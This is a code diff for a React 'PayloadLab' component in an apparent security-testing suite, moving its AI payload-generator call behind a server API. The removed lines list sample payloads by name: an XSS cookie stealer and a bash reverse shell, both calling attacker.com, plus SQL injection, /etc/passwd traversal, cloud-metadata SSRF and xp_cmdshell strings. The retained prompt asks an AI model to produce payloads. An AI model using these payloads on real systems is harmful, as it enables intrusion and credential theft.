@@ -16,7 +16,6 @@ import {
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 import { cn } from '@/src/lib/utils';
-import { GoogleGenAI } from "@google/genai";
 import { logToTerminal } from './Terminal';
 
 type PayloadType = 'xss' | 'sqli' | 'rce' | 'lfi' | 'ssrf' | 'custom';
@@ -60,83 +59,32 @@ export default function PayloadLab() {
     logToTerminal(`Generating custom ${activeType.toUpperCase()} payload...`, 'info');
 
     try {
-      const apiKey = process.env.GEMINI_API_KEY;
-
-      if (!apiKey || apiKey === 'undefined' || apiKey === '') {
-        setTimeout(() => {
-          const fallbackPayloads: Record<string, any> = {
-            'xss': {
-              name: "Cookie Stealer",
-              content: "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
-              description: "Standard XSS payload for cookie exfiltration.",
-              risk: "high"
-            },
-            'sqli': {
-              name: "Union-based Extraction",
-              content: "' UNION SELECT username, password FROM users --",
-              description: "SQL injection to extract user credentials.",
-              risk: "critical"
-            },
-            'rce': {
-              name: "Reverse Shell",
-              content: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
-              description: "Bash reverse shell for remote command execution.",
-              risk: "critical"
-            },
-            'lfi': {
-              name: "Passwd Disclosure",
-              content: "../../../../../etc/passwd",
-              description: "Local file inclusion to read sensitive system files.",
-              risk: "high"
-            },
-            'ssrf': {
-              name: "AWS Metadata Probe",
-              content: "http://169.254.169.254/latest/meta-data/",
-              description: "SSRF payload targeting cloud metadata services.",
-              risk: "high"
-            },
-            'custom': {
-              name: "Custom Security String",
-              content: "'; exec master..xp_cmdshell 'net user' --",
-              description: "Advanced custom payload for environment-specific testing.",
-              risk: "critical"
-            }
-          };
-
-          const data = fallbackPayloads[activeType] || fallbackPayloads['custom'];
-          const newPayload: Payload = {
-            id: Math.random().toString(36).substr(2, 9),
-            type: activeType,
-            ...data
-          };
-
-          setPayloads([newPayload, ...payloads]);
-          logToTerminal('Custom payload generated successfully (Offline Mode).', 'success');
-          setCustomPrompt('');
-          setGenerating(false);
-        }, 1500);
-        return;
-      }
-
-      const ai = new GoogleGenAI({ apiKey });
-      const response = await ai.models.generateContent({
-        model: "gemini-3-flash-preview",
-        contents: `You are a cybersecurity researcher. Generate a technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
-        
-        Provide the output in JSON format:
-        {
-          "name": "Short descriptive name",
-          "content": "The actual payload string",
-          "description": "Brief technical explanation",
-          "risk": "low/medium/high/critical"
-        }`,
-        config: {
-          systemInstruction: "You are a CyberSuite OS Payload Generator. Be technical and precise. Only provide the JSON object. Do not include markdown blocks.",
-          responseMimeType: "application/json"
-        }
+      const response = await fetch('/api/ai-generate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          contents: [{ role: 'user', parts: [{ text: `You are a cybersecurity researcher. Generate a technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
+          
+          Provide the output in JSON format:
+          {
+            "name": "Short descriptive name",
+            "content": "The actual payload string",
+            "description": "Brief technical explanation",
+            "risk": "low/medium/high/critical"
+          }` }] }],
+          config: {
+            systemInstruction: "You are a CyberSuite OS Payload Generator. Be technical and precise. Only provide the JSON object. Do not include markdown blocks.",
+            responseMimeType: "application/json"
+          }
+        })
       });
 
-      const data = JSON.parse(response.text);
+      if (!response.ok) {
+        throw new Error('AI Generation failed');
+      }
+
+      const resData = await response.json();
+      const data = JSON.parse(resData.text);
       const newPayload: Payload = {
         id: Math.random().toString(36).substr(2, 9),
         type: activeType,
